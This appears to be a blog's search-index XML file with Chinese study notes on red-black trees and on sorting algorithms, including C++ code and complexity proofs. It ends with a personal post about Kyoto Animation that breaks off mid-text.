<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Data Structure Note(V) —— RB Tree]]></title>
    <url>%2F2019%2F10%2F04%2Fdata-structure5%2F</url>
    <content type="text"><![CDATA[prologue 这是数据结构大杂烩系列的第五篇文章(有生之年系列)。在前几篇文章中，我们学习了几种树结构，以及treap和splay两种平衡树。今天，我们将介绍一种应用十分广泛，且性能也十分优秀的平衡树——红黑树。不过由于网上资料较多，且笔者能力有限，这篇文章只是对算法导论中关于红黑树的知识的一些简单整理而已。 what is RB-Tree 首先，需要回答这样一个问题:为什么使用红黑树呢？答案其实是很简单的。因为红黑树的表现十分优秀！红黑树能够保证树不会退化成链表，导致效率的急剧下降。简单来说，红黑树是一颗特殊的二叉搜索树，它在每个节点上增加了一个存储位来表示节点的颜色(红或黑)。并且，由于这一个特性，红黑树中到叶子节点的简单路径中，不会有一条路径长度是其他路径的两倍。 红黑树满足以下性质: 每个结点是黑色或者红色 根节点是黑色 每个叶子结点是黑色的(NIL) 如果一个结点是红色的，那么它的两个子结点都是黑色的 对每个结点，该结点到所有后代叶结点的简单路径上均包含相同数目的黑色结点 一颗合法的红黑树: 同时，红黑树中有一种特殊的节点是NIL，起到相当与空结点的作用，但可以减少一些边界判断(其实就是哨兵)。另外，由于红黑树的性质5，我们可以定义红黑树的黑高bh，定义为该结点到所有叶结点的路径上黑色结点的数量。 此时，我们可以证明，一颗有n个内部结点(即不含NIL)的红黑树高度至多为\(\,2log(n+1)\) 证明: 先证任一结点为根的子树中至少包含\(\,2^{bh(x)}-1\)个内部结点。可以用数学归纳法证明。又由于根到任意叶子结点的任何一条路径上都至少有一半的结点为黑色(性质4)，因此有\(n &gt;= 2^{h/2}-1\)，整理得，\(h&lt;=2log(n+1)\) 我们接下来可以知道，红黑树上的插入，删除等操作的运行时间均为O(h)，因此我们可以得到这些操作的时间都是O(logn) 这篇文章接下来将以洛谷P3369为例子，讲讲如何简单地实现红黑树。我们将实现以下操作: 插入数字x 删除数字x 查询数字x的排名 查询排名为x的数字 求x的前驱(比x小的数字中最大的那个) 求x的后继(比x大的数字中最小的那个) 以下是红黑树的结点的定义: 1234567891011121314151617181920#define RED 0#define BLACK 1#define T Node*struct Node &#123; T fa; T lson; T rson; // 需要维护的数据: 键值v，子树大小siz，该结点的次数cnt，颜色color int v, siz, cnt; bool color; // 构造函数 Node(int v, int siz = 1, int cnt = 1, int color = RED): v(v),siz(siz),cnt(cnt),color(color)&#123;&#125; // up操作 void up() &#123; // 注意我们需要保证空结点NIL的size为0，否则会出问题 if (cnt == 0) return; siz = lson-&gt;siz + rson-&gt;siz + cnt; &#125;&#125;; how to implement Red-black Treerotation 我们知道，插入，删除等操作有可能会违背红黑树的红黑特性，因此我们需要一种操作来维持红黑树的特性不被改变，这就是旋转操作。和treap类似却又不太一样:红黑树的旋转同样分为左旋和右旋，但左旋是将当前节点旋转到左儿子的位置，右旋同理。具体操作如下: 1234567891011121314151617181920212223// 这里展示左旋的写法，右旋和左旋写法对称void rotL(T x) &#123; // partI 连接x和y的左儿子 T y = x-&gt;rson; x-&gt;rson = y-&gt;lson; if (y-&gt;lson != nil) &#123; y-&gt;lson-&gt;fa = x; &#125; // partII y和x的父亲 y-&gt;fa = x-&gt;fa; if (x-&gt;fa == nil) &#123; rt = y; &#125; else if (x-&gt;fa-&gt;lson == x) &#123; x-&gt;fa-&gt;lson = y; &#125; else &#123; x-&gt;fa-&gt;rson = y; &#125; // partIII 连接x和y x-&gt;fa = y; y-&gt;lson = x; // 最后别忘了up操作。注意x和y的先后顺序 x-&gt;up();y-&gt;up();&#125; insert 我们先考虑普通的BST的情况。这种情形下，我们只需要找到一个可以插入数字v的节点即可。如果找到了，我们就直接将该结点的次数+1即可。如果找不到，我们就重新new一个结点。考虑到我们需要维护子树的大小，我们可以在查找的时候顺便更新一下查找路径上所有结点的siz。 12345678910111213141516171819void insert(int v) &#123; T cur = root; while (cur != NIL) &#123; cur-&gt;siz++; if (v &lt; cur-&gt;v) &#123; cur = cur-&gt;lson; &#125; else if (v &gt; cur-&gt;v) &#123; cur = cur-&gt;rson; &#125; else &#123; // 找到了，直接次数+1后返回 cur-&gt;cnt++; return; &#125; &#125; // 找不到时，重新new一个结点 cur = new Node(v); // 这里需要连接结点cur和父结点，并将左右儿子指向NIL ...&#125; 写到这里，又会有一个问题，新结点的颜色呢？为了满足红黑树的性质，新的节点只能是红色或者黑色。如果我们将新的结点设置为黑色的话，会发生什么情况？性质5会被破坏，如果我们想修复性质5，处理起来是很麻烦的。因此我们选择将新的结点设置为红色。这个时候，性质2，性质4有可能被破坏。修复性质2的话其实很简单，我们只需要将根节点设置为黑色就可以了(根节点的颜色不影响黑高bh)。修复性质4的话，我们需要分类讨论。我们在insert方法的最后，调用insert-fixed方法，维护红黑树的特性。 当插入节点的父结点为红色时，违背了性质4，这个时候我们需要通过旋转和重新染色来进行修复。首先，如果当前结点的父亲是黑色的话，那么不违背红黑树的性质，直接退出即可。否则，假设当前结点的父亲是祖先的左儿子，这时分三种情况讨论。(注意到父亲结点为红色时，祖先结点必然存在，因为根节点是黑色的) 情况1中，当前结点的叔叔结点为红色，这个时候我们可以将当前结点的父亲和叔叔染成黑色，将祖先染成红色，这个时候各个叶子结点的黑高并没有发生改变，故解决了问题。但是将祖先结点染成红色有可能会导致破坏了性质4，因此将x赋值为祖先结点，继续循环。 情况2中，叔叔结点为黑色，当前结点是父亲的右儿子。这个时候我们将x赋值为其父亲结点，同时对父亲结点进行左旋操作，就进入了情况3。 情况3中，叔叔节点为黑色，当前结点是父亲的左儿子，这个时候将父亲结点染成黑色，祖先结点染成红色，并对祖先结点进行一次右旋，然后我们就发现，红黑树的性质得到了维护，循环可以退出了。注意到右旋时，由于父亲结点是红色，因此兄弟结点一定是黑色，对祖先结点右旋后两个儿子都是黑色的，因此没有破坏性质4。 至于当前结点的父亲是祖先的右儿子时，情况也是一样的。只要把左儿子改为右儿子，左旋改为右旋就可以了。 123456789101112131415161718192021222324252627282930void insert_fixed(T x) &#123; while (x-&gt;fa-&gt;color == RED) &#123; if (x-&gt;fa == x-&gt;fa-&gt;fa-&gt;lson) &#123; T y = x-&gt;fa-&gt;fa-&gt;rson; // 情况1: 叔叔结点为红色 if (y-&gt;color == RED) &#123; y-&gt;color = x-&gt;fa-&gt;color = BLACK; x-&gt;fa-&gt;fa-&gt;color = RED; x = x-&gt;fa-&gt;fa; &#125; // 情况2: 叔叔结点为黑色，且当前结点是父亲的右儿子 else if (x == x-&gt;fa-&gt;rson) &#123; x = x-&gt;fa; rotL(x); &#125; // 情况3: 叔叔结点为黑色，且当前节点是父亲的左儿子 else &#123; x-&gt;fa-&gt;color = BLACK; x-&gt;fa-&gt;fa-&gt;color = RED; rotR(x-&gt;fa-&gt;fa); &#125; &#125; else &#123; // 这里的写法和之前是对称的 ... &#125; &#125; // 别忘了把根节点设置为黑色 rt-&gt;color = BLACK;&#125; remove 删除操作应该是最繁琐的一项了。同样的，我们先考虑普通的BST的情况。这种情形下，我们只需要找到需要删除的点的位置即可，并将该结点的次数-1，如果次数大于0，我们则可以直接返回，次数等于0时，则说明当前结点需要被移除。同样的，由于我们需要维护子树的大小，我们可以在查找的时候顺便更新一下查找路径上所有结点的siz。 那么该如何移除呢？在BST中，我们的做法是找出结点v的后继y，用y来替换结点v的位置(y的颜色也变成v的颜色)，同时，我们把y的右儿子提到y的位置(注意到y没有左儿子，因为它是v的后继，即v的右子树中最小的值)，这样我们就成功地将原先结点移除了。但是，由于y结点被x结点替换了，有可能会导致红黑树的特性被破坏，这里我们需要记录y原来的颜色，以便于我们的恢复操作。操作过后，对于整棵树来说，相当于少了一个y结点。如果y是红色，那么红黑树的性质并没有被破坏，直接返回即可。如果y是黑色，y节点(即当前x的位置)的所有子结点的黑高小了1，违背了性质5，同时也有可能违背了性质4。因此我们需要使用一个修复函数来维护红黑树的特性。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667// 连接v结点和u结点的父亲void transplant(T u, T v) &#123; if (u-&gt;fa == nil) rt = v; else if (u == u-&gt;fa-&gt;lson) &#123; u-&gt;fa-&gt;lson = v; &#125; else &#123; u-&gt;fa-&gt;rson = v; &#125; v-&gt;fa = u-&gt;fa;&#125;void remove(int v) &#123; T cur = rt; // 获取值v对应的结点的指针 while (cur != nil) &#123; cur-&gt;siz--; if (v &lt; cur-&gt;v) cur = cur-&gt;lson; else if (v &gt; cur-&gt;v) cur = cur-&gt;rson; else &#123; cur-&gt;cnt--; break; &#125; &#125; // 大于0直接返回 if (cur-&gt;cnt &gt; 0) return; T y = cur; T x; bool originColor = y-&gt;color; // 左儿子或右儿子是空的，直接替换即可 if (cur-&gt;lson == nil) &#123; x = cur-&gt;rson; transplant(cur, x); &#125; else if (cur-&gt;rson == nil) &#123; x = cur-&gt;lson; transplant(cur, x); &#125; // 左右儿子都非空，我们需要用y的后继来替换当前结点 else &#123; // 获得当前结点cur的后继及其颜色 y = cur-&gt;rson; while (y-&gt;lson != nil) y = y-&gt;lson; originColor = y-&gt;color; // y的右结点替换y x = y-&gt;rson; // y如果是cur的子结点，那么x父亲应该指向y，注意到x也可以是NIL // 否则应该用x替换y，y替换cur if (y-&gt;fa == cur) &#123; x-&gt;fa = y; &#125; else &#123; transplant(y, x); y-&gt;rson = cur-&gt;rson; cur-&gt;rson-&gt;fa = y; &#125; transplant(cur, y); y-&gt;lson = cur-&gt;lson; y-&gt;lson-&gt;fa = y; y-&gt;color = cur-&gt;color; // 从初始的y的位置到cur的位置上的所有结点的siz需要更新 T c = x; while (c != y) &#123; c = c-&gt;fa; c-&gt;up(); &#125; &#125; delete cur; if (originColor == BLACK) remove_fixed(x);&#125; 假设结点y的初始颜色是黑色，那么我们应该如何修复呢？我们可以这样考虑:结点y删除后，y的黑色由x来继承，这样x就相当于是一个具有双重颜色的结点”红黑或者黑黑”，这样，性质5就没有被破坏，但有可能破坏了性质1，2，和4。我们需要做的其实就是把其中的一重颜色去掉。 首先，如果x是红黑结点时，那么我们可以把它直接变成黑色结点。这种情况下所有性质都得到了维护。另外，如果x是根结点时，无论x是红黑结点或者是黑黑结点，我们都只需要直接把它变成黑色即可。因此，我们需要考虑的就是x是双黑结点且不是根节点的情况。类似的，我们假设当前结点是父亲的左儿子。这时，分四种情况讨论。 对于情况1，其兄弟结点是红色，这个时候我们可以将兄弟结点变成黑色，并把父亲结点变成红色，再对父亲结点进行左旋，这个时候，我们发现得到的新的树中，x的兄弟结点就变成了黑色，转化为情况2～4 对于情况2，其兄弟结点和兄弟结点的左右儿子都是黑色，那么我们可以把兄弟结点变成红色，并把x的父亲赋值给x，这样，我们就相当与将x的其中一重黑色移动到了它的父亲结点上。 对于情况3，兄弟结点是黑色，兄弟节点的右儿子是黑色，左儿子是红色。这个时候我们将兄弟结点变成红色，兄弟结点的左儿子变成黑色，并对兄弟结点进行右旋操作，转化为情况4 对于情况4，兄弟节点是黑色，且兄弟结点右儿子是红色，交换父亲结点和兄弟结点的颜色，并把兄弟节点的右儿子染成黑色，再将父亲结点进行左旋，这个时候我们就相当于把黑色转移到了父亲结点上，可以直接退出循环。 在这4中情况下，由于情况1会转为2~4，情况3会转为情况4，并且情况4可以直接完成旋转和染色，情况2每次迭代高度都会减少1，因此最后的复杂度为O(logn)。这样，我们就完成了修复函数的一半 类似的，当前结点是父亲的右儿子时，操作完全一样，只要左儿子变成右儿子，左旋变成右旋对称地处理即可。代码见下方: 1234567891011121314151617181920212223242526272829303132333435363738394041void remove_fixed(T x) &#123; // 到达根节点或者当前结点是红色时，退出循环 while (x != rt &amp;&amp; x-&gt;color == BLACK) &#123; if (x == x-&gt;fa-&gt;lson) &#123; T w = x-&gt;fa-&gt;rson; // 情况1 if (w-&gt;color == RED) &#123; w-&gt;color = BLACK; x-&gt;fa-&gt;color = RED; rotL(x-&gt;fa); w = x-&gt;fa-&gt;rson; &#125; // 情况2 if (w-&gt;lson-&gt;color == BLACK &amp;&amp; w-&gt;rson-&gt;color == BLACK) &#123; w-&gt;color = RED; x = x-&gt;fa; &#125; // 情况3 else if (w-&gt;rson-&gt;color == BLACK) &#123; w-&gt;lson-&gt;color = BLACK; w-&gt;color = RED; rotR(w); w = x-&gt;fa-&gt;rson; &#125; // 情况4 else &#123; w-&gt;color = x-&gt;fa-&gt;color; x-&gt;fa-&gt;color = BLACK; w-&gt;rson-&gt;color = BLACK; rotL(x-&gt;fa); // 把x赋值为根节点，就可以直接退出循环 x = rt; &#125; &#125; else &#123; // 这里对称地处理即可 ... &#125; &#125; // 别忘了把根节点变成黑色 x-&gt;color = BLACK;&#125; other operation 为了完成题目，我们还需要实现rank,search,pre,next等函数，这里写法其实和普通的平衡树没有任何区别，不过这里还是简单提一下吧。具体的代码就不贴了。 rank函数，查找某一个数字的排名。我们沿着树遍历，若当前节点的值大于我们要找的数字，说明这个数字在左边，往左子树走。若当前结点的值等于我们要找的数字，说明左子树上所有节点都小于我们要找的数字，因此返回累计值加上左子树的大小再+1。若当前结点的值小于我们要找的数字，则累计值应该加上当前结点的次数和左子树的大小，并且往右子树方向找。 search函数，查找排名为x的数字的值。如果左子树的大小大于当前要找的排名，往左找。如果左子树加上当前的结点的次数小于要找的排名，往右找，同时排名减去左子树和当前结点次数。否则说明排名为x的数字刚好就是当前结点对应的值 pre函数，查找前驱。我们知道，前驱比当前结点小，故应该在结点的左子树当中，且是左子树中最大的那个。因此，我们只要找左子树中最大的值即可。找最大值的话就只需要不断地试着往右儿子移动，当右儿子为空时，当前结点就是最大值 next函数，查找后继。同样的，我们只需要查找右子树中最小的值即可。只需要在右子树中不断往左儿子方向走，左儿子为空时即为后继。 epilogue 红黑树这一期到这里应该就结束了，这一期主要还是作为笔记，以加深自己的印象。红黑树整体来说应该不能算是很难的一种数据结构，但它的分类很多，很繁琐而且并不好记，因此给人一种望而生畏的感觉。红黑树最大的难点应该还是在插入和删除时对红黑树特性的维护那个部分，这个可能只能强行背一下了，似乎也没有什么更好的记忆办法。作为一名喜欢算法与数据结构的程序员，红黑树是不得不掌握的。]]></content>
      <categories>
        <category>Data Structure</category>
      </categories>
      <tags>
        <tag>Data Structure</tag>
        <tag>Balanced Tree</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sort-algorithm]]></title>
    <url>%2F2019%2F09%2F27%2Fsort-algorithm%2F</url>
    <content type="text"><![CDATA[prologue 这是算法导论系列的第一篇文章。该系列主要将记录自己在学习算法导论的过程中的一些笔记以及心得体会等。接下来的几个月内应该会陆陆续续地更新，可能打算做比较多期，希望能够继续坚持做下去吧。在这个系列中，代码方面将以类似于算法导论中的伪代码的形式记录(或者是C语言)，另外，该系列文章均假设读者对基础的数据结构有一定的了解(链表，栈，队列等)。 今天的第一期主题就是排序算法，作为应用最广泛的算法之一，排序算法在整个算法体系中有着举足轻重的作用。因此，现在就让我们一起来学习吧。下文排序均默认按照从小到大的顺序。 normal sort algorithm 以下几种算法是最基础的排序算法，思路较为简单，实现起来比较容易，但是复杂度均为$$O(n^2)$$ 当然，常数比较小，在小数据的情形下和其他算法花费的时间还是比较接近的。 bubble sort 提到排序算法，我们最容易想到的也许就是冒泡排序了。如同它的名字一样，冒泡排序的做法就是用“冒泡”的形式不断将较小的数字提升到前面来。我们可以通过以下的排序方式实现: 123456789101112void bubbleSort(int* a, int len) &#123; for (int i = 0; i &lt; len; i++) &#123; bool flag = false; for (int j = len-1; j &gt; i; j--) &#123; if (a[j] &lt; a[j-1]) &#123; swap(a[j],a[j-1]); flag = true; &#125; &#125; if (!flag) break; &#125;&#125; 思路很简单，我们也很容易能够看出，冒泡排序的复杂度是O(x^2)，然而，冒泡排序存在几个问题： 有时候数组已经有序了，但是冒泡排序还是会继续进行循环，导致效率降低，上面我们采用了一个标记，当数组已经有序时，循环退出 当数组是逆序存储时，冒泡排序需要进行很多次的交换，导致效率降低，事实上我们会发现，一个数字从底部冒泡一次一格移动到顶部是很浪费时间的，因此就有了一种优化的办法：双向冒泡排序，这种优化算法能一定程度上降低常数 另外，冒泡排序还有一个很重要的作用就是，它可以用来计算逆序对(j&gt;i 但是 a[j]&lt;a[i])的个数，注意到当我们交换两个数字时，整个数组的逆序对的数量就减少了1，因此我们只要统计数组的交换次数，就可以计算总逆序对的数量了。 insert sort 插入排序也是一种很经典的排序算法。具体就是一开始建立一个空数组，每次我们往其中插入一个数字，并维护数组的有序性，最后得到的就是一个有序的数组了。具体做法如下: 12345678void insertSort(int* a, int len) &#123; for (int i = 1; i &lt; len; i++) &#123; for (int j = i; j &gt; 0; j--) &#123; if (a[j] &lt; a[j-1]) swap(a+j,a+j-1); else break; &#125; &#125;&#125; select sort 选择排序同样是一种简单的排序算法，和插入排序类似，选择排序同样是逐步往数组中插入元素，但不同的是选择排序每次选择最大的那一个数字插入数组中，最后得到一个有序的数组，具体做法如下: 123456789101112void selectSort(int* a, int len) &#123; for (int i = 0; i &lt; len; i++) &#123; int idx = i, _min = a[i]; for (int j = i+1; j &lt; len; j++) &#123; if (a[j] &lt; _min) &#123; _min = a[j]; idx = j; &#125; &#125; swap(a[i],a[idx]); &#125;&#125; improved sort algorithm 前面我们用到的集中算法都有着一个很大的问题：复杂度太高了，这样的复杂度对我们来说很难接受。人们发明了很多其他优秀的算法来进行排序，使得时间复杂度降低到O(nlogn)。以下就是几种最经典的优化算法。 heap sort 按照算法导论的顺序，第一个讲到的应该是堆排序。这种排序用到了二叉堆，其中，二叉堆支持以下操作： INSERT 把元素插入堆中，保证维护堆的特性，复杂度为O(logn) REMOVE 移除堆顶元素，具体做法是将该元素交换到堆的尾部，然后重新调整堆即可。复杂度O(logn) 有了这样的一个堆的结构，我们就可以逐步往数组中插入所有元素，然后再一个一个弹出，最后按照弹出的顺序，我们得到了一个有序的数组(这里数组的下标从1开始)。 具体的代码如下:1234567891011121314151617181920212223242526272829303132#define LSON(a) ((a)&lt;&lt;1)#define RSON(b) ((b)&lt;&lt;1|1)// 这里只是为了方便而设置为全局变量，最恰当的做法应该是把这些函数封装为一个结构体int heapSize = 10;void maxHeapify(int* a, int i) &#123; int l = LSON(i); int r = RSON(i); int largest = i; if (l &lt;= heapSize &amp;&amp; a[l] &gt; a[largest]) &#123; largest = l; &#125; if (r &lt;= heapSize &amp;&amp; a[r] &gt; a[largest]) &#123; largest = r; &#125; if (largest != i) &#123; swap(a+largest, a+i); maxHeapify(a, largest); &#125;&#125;void buildHeap(int* a) &#123; for (int i = heapSize/2; i &gt; 0; i--) &#123; maxHeapify(a, i); &#125;&#125;void heapSort(int* a) &#123; buildHeap(a); for (int i = heapSize; i &gt; 1; i--) &#123; swap(a+i,a+1); heapSize--; maxHeapify(a, 1); &#125;&#125; 我们会发现，堆排序的时间复杂度还是十分不错的，建树和排序的复杂度均为O(nlogn)，最后总体的复杂度还是O(nlogn)。比起前面的几种算法，这是一个很大的优化。另外，堆排序还能应用于实现优先队列。堆中的每个节点存放的是关键字以及一些卫星数据。我们依照关键字实现一个最大堆或者最小堆，每次需要的时候就直接弹出即可。 merge sort 和堆排序类似，归并排序也是一种十分优秀的排序算法，不过归并没有用到堆这样的一种数据结构，而是用到了分治的思想，同样是一种应用广泛的算法思想。 分治，即分而治之。对与一个长度为N的数组的排序问题，我们可以试着将这个问题规模变小。我们知道，一个问题规模越小，往往越有助于我们的求解。因此，我们不妨考虑下将一个这个数组分成两个大小为N/2的数组，如果我们拥有两个长度为N/2的有序数组，那么我们可以在O(n)的时间内将这两个数组合并为一个长为N的数组。依次递归下去，直到数组的长度变为O(1)，退出递归。这样，我们就得到了这个表达式：$$T(n)=2*T(n/2)+O(n)$$ 使用代入法或主方法，我们可以得到这个表达式的解为T(n)=O(nlogn)。 具体代码如下:12345678910111213141516171819202122232425262728293031323334#define N 100int c[N];void merge(int*a, int l, int r) &#123; int mid = (l+r)&gt;&gt;1, p1 = l, p2 = mid+1; for (int i = l; i &lt;= r; i++) &#123; // 每次获取两个子数组的队头中更大的那一个加入数组c if (p1 &gt; mid) &#123; c[i] = a[p2]; p2++; &#125; else if (p2 &gt; r) &#123; c[i] = a[p1]; p1++; &#125; else &#123; if (a[p1] &lt; a[p2]) &#123; c[i] = a[p1]; p1++; &#125; else &#123; c[i] = a[p2]; p2++; &#125; &#125; &#125; for (int i = l; i &lt;= r; i++) &#123; a[i] = c[i]; &#125;&#125;void mergeSort(int*a, int l, int r) &#123; if (l &gt;= r) return; int mid = (l+r)&gt;&gt;1; mergeSort(a, l, mid); mergeSort(a, mid+1, r); merge(a,l,r);&#125; quick sort 快速排序，对于刚刚了解排序的人来说是一个比较难的算法。其解决问题的思路并不是那么直接。因此，需要我们多花点时间在这上面。尽管快速排序在最坏情况下的复杂度达到了Θ(n^2)，但是期望复杂度却是Θ(nlogn)。更重要的是，它隐含的常数因子是很小的，在大多数情况下，其表现比堆排序，归并排序还要优秀一些。 和归并排序类似，快排也用到了分治的思想，但是其做法和归并差别很大。对于归并排序来说，我们选择的是将数组平均分成两个部分，通过将这两个部分分别排序后再进行合并，我们成功地把复杂度降低到了O(nlogn)。然而，快排的思路是从数组中选出一个数字，并且按照比该数字小或比该数字大，将数组分成了两个部分，并依次对这两个部分进行递归。最后我们就得到了一个有序的数组了。由于每一次递归我们都能保证左边任何数字都小于右边的任何数字，我们最终能保证得到的数组是有序的。 算法具体如下:1234567891011121314151617181920int partition(int* a, int l, int r) &#123; int key = a[r]; int i = l-1; for (int j = l; j &lt; r; j++) &#123; if (a[j] &lt;= key) &#123; i++; swap(a+j,a+i); &#125; &#125; i++; swap(a+i,a+r); return i;&#125;void quickSort(int* a, int l, int r) &#123; if (l &lt; r) &#123; int mid = partition(a, l, r); quickSort(a, l, mid-1); quickSort(a, mid+1, r); &#125;&#125; 在最理想的情况下，我们的数组被key平均地分成了两个部分，我们得到递归式$$T(n)=2*T(n/2)+Θ(n)$$ 看起来我们的快排似乎没什么问题了，复杂度是Θ(nlogn)。但是，如果我们仔细观察快排选取key的策略的话，我们会发现，当遇到一个数组本来就有序时，每个步骤中数组被划分为了长度为0和N-1的两个部分，快排的复杂度竟然高达了Θ(n^2)，这对我们来说是不能接受的。那么平均情况呢？我们假设快排产生一次最佳划分和一次最差划分，则两次划分后，我们还是得到了两个长度近似为N/2的数组，这说明了我们的快速排序还是十分优秀的。另外，可以证明，即使快排产生的划分十分不均匀时(比如1:9)，我们得到的时间复杂度依然为O(nlogn)，可以使用递归树证明。 为了解决快排出现最坏情况的问题，我们可以采用一种随机的方式对快排进行简单的优化，每一次我们选取的不再是最右边的点，而是一个随机的位置，这样就能在很大程度上避免快排达到Θ(n^2)复杂度的情况了。我们只需更改quickSort函数即可。 123456789void quickSort(int* a, int l, int r) &#123; if (l &lt; r) &#123; int x = rand()%(r-l+1)+l; swap(a[x],a[r]); int mid = partition(a, l, r); quickSort(a, l, mid-1); quickSort(a, mid+1, r); &#125;&#125; 接下来，我们考虑如何证明快速排序的期望复杂度为Θ(nlogn)。为了证明这个问题，我们考虑Partition函数中的for语句。显然，算法最多调用n次partition函数，那么我们如果能求出partition中，if语句的期望执行次数X，那么我们就可以得到快排的复杂度为Θ(n+X) 如何计算比较操作的执行次数呢？这里需要扩充一下定义，我们将数组A的元素重新命名为\(z_i\)，表示数组A中第i小的元素，并且还定义了Z表示一个区间:\(Z_{ij} = {z_i, z_{i+1}, …, z_j}\) 另外，我们还要用到算法导论第五章讲到的指示器随机变量:$$X_{ij}=I\,\{z_i与z_j比较\}$$ 由此，我们得到了算法的总比较次数，再由数学期望的线性特性，我们可以得到:$$X = \sum_{i=1}^{n-1}\sum_{j=i+1}^{n}X_{ij}$$$$E(X)=E[\,\sum_{i=1}^{n-1}\sum_{j=i+1}^{n}X_{ij}\,]= \sum_{i=1}^{n-1}\sum_{j=i+1}^n E[\,X_{ij}\,]= \sum_{i=1}^{n-1}\sum_{j=i+1}^{n}Pr\{z_i与z_j进行个比较\}$$ 那么，\(z_i和z_j比较\)的概率究竟怎么算？从正面比较难考虑的话我们可以试着从反面考虑:两个元素不会进行比较的情况。考虑快速排序的一个输入为1-10这10个数字(顺序任意)，并假设第一个主元为7，那么数字被分为两个集合{1,2,3,4,5,6}和{8,9,10}，并且第一个集合任意元素不会再和第二个集合的任意元素有比较了。这就告诉我们，在元素互异的情况下，一旦一个满足\(z_i &lt; x &lt; z_j\)的主元x被选择后，\(z_i,z_j\)就不会再有比较了。而在这个区间上，这每一个数字被选到的概率应该是相等的。由此，我们得到:$$\begin{align}Pr\{z_i与z_j比较\} =&amp; Pr\{z_i或z_j被选为Z_{ij}的第一个主元\}\\=&amp; Pr\{z_i是Z_{ij}的第一个主元\}+Pr\{z_j是Z_{ij}的第一个主元\}\\=&amp; \frac{1}{j-i+1}+\frac{1}{j-i+1}\\=&amp; \frac{2}{j-i+1}\end{align}$$ 再将两个式子联立，我们可以得到:$$\begin{align}E[X] =&amp; \sum_{i=1}^{n-1}\sum_{j=i+1}^{n}\frac{2}{j-i+1} \\=&amp; \sum_{i=1}^{n-1}\sum_{k=1}^{n-i}\frac{2}{k+1}\\=&amp; \sum_{i=1}^{n-1}\sum_{k=1}^{n}\frac{2}{k}\\=&amp; \sum_{i=1}^{n=1}O(logn)\\=&amp; \,O(nlogn)\end{align}$$ 最终，在元素互异的前提下，我们得到了快速排序期望复杂度的一个上界O(nlogn) 另外，书中还给出了另外一种证明快排的复杂度的方法，这种方法关注的不是比较的次数，而是每一次单独递归调用的期望运行时间。利用递归式和不等式放缩，最后再使用代入法进行证明，这里省略了。 这样就结束了吗？当然不是。我们其实还会发现一个问题，如果元素不互异呢？假如现在有一个数组，其中所有元素都相同，这个时候复杂度是多少呢？结果有点遗憾，是O(n^2)。为了处理这样的一种情形，我们可以采取这样的一种措施，在partition函数中，将原数组分为3个部分，左边部分比key小，右边部分比key大，中间部分和key的大小相同，这样就解决了这个问题了。 此外，在具体进行快速排序的时候，还有一个小优化可以做:当数组长度很小时(比如n&lt;8)，我们可以转换排序策略，选择插入排序。测试表明，插入排序在数组很小的时候复杂度是比较优的。经过这样的调整，能在某种程度上提高快排的运行效率。 other sort algorithm 前面我们提到的两类排序算法复杂度分别为O(n^2)和O(nlogn)。这些排序算法都有一个相同的特点——各元素的次序依赖于对他们的比较，这类排序被称为比较排序。为了解决排序算法的下界问题，我们需要用到决策树模型。决策树是一颗完全二叉树，它可以表示在给定输入规模的情况下，某一特定排序算法对所有元素的比较操作。树中每个内部节点以i:j标记。每个叶子节点对应一个数列。排序算法的执行则相当于一条从树的根节点到叶节点的路径。到达一个叶节点时，表明排序已经完成。 对于一个n个元素的数组，共有n!种排列，每一种排列都必须位于树的某一个节点。若设该决策树有l个节点，高度为h，则我们有:$$n! &lt;= l &lt;= 2^h$$ 对两边取对数，我们有:$$\begin{align}h &amp;&gt;= lg(n!)\\&amp;= Ω(nlgn)\end{align}$$ 由此，我们得到了比较排序算法的一个下界为Ω(nlgn)。那么我们如果想要突破这个下界，就不能采用比较的关系去实现排序算法了。我们需要另辟溪径。 桶排就是这样的一个算法，它平均情况下的复杂度为O(n)，看起来要比前面的所有算法都要优秀许多。 桶排假设数服从均匀分布。假设数据分布在区间[0,1)上，现在给n个桶，那么我们将区间分为n个相同大小的子区间，并对应于给定的桶，将位于区间内的数放到对应的桶中，最后遍历每个桶，并对桶中的每个数字进行排序，再按顺序列出即可。当然，也可以使用Hash，将某些区间的值映射到某个桶中。 另外，还有计数排序和基数排序，他们都是运行时间十分优秀的算法，不过需要使用额外的空间，且依赖于数字的大小，但在某些情况下能够有较优异的表现。 epilogue 到这里，我们的算法导论系列的第一期就结束了。这一期主要记录了一些排序算法的思想，重点关注快排，归并这两种算法。我们简单地提了这些排序算法的写法，并提了一下复杂度的分析。接下来，按照算法导论的顺序，下一期可能要写一下红黑树的笔记吧。]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>algorithm</tag>
        <tag>sort</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kyouto Animation]]></title>
    <url>%2F2019%2F07%2F19%2FAnimation%2F</url>
    <content type="text"><![CDATA[希望这场灾难中的逝者安息，伤者早日康复。 – 等待，并心怀希望 序 其实我自己也不知到为什么要来写这样的一篇博客。不过我想，既然是自己的博客，内容也不必拘泥于技术方面，记录一些自己的所思，所想也是很重要的。另一个原因的话应该是自己受动画，尤其是京都动画的影响确实很大，即使说是影响到世界观，人生观，价值观的形成也不为过。 我眼中的京都动画 京都动画(京アニ)作为一家动画公司，真正开始独立地制作动画开始于2003年，munto和全金属狂潮。再到后面，接下了key社三部曲的gal改动画(Kanon, Air, Clannad)，一步步开始走向巅峰，其中CL更是几乎在全世界各大网站的评价都是排行前几，可以说，这是一部被大多数宅圈子的人认可的优秀作品。后面，凉宫春日系列，更是让京阿尼收割了一大波人气，优秀的制作，各种全新的套路设定，可以说是开创性的，被誉为”两亿人的凉宫”。后面，《けイオン！》(轻音少女)更是被称为强国源泉，令人舒适的剧情和人设开创了萌系动画的先河。其后，《氷菓》，《Free!》，《日常》，《吹响吧！上低音号》，《紫罗兰永恒花园》等优秀作品同样为他赢得了不小的人气。 京都脱离角川文库，可以说是一个重要的转折点。在此之后，京都似乎陷入了困境：尽管作品的作画质量依旧越来越优秀，剧情却有点令人担心，甚至怀疑京都还能坚持多久。当然，京都也在一步步地努力，在业界普遍是制作商为出版商打工的今天，可以说，京都是一股清流。 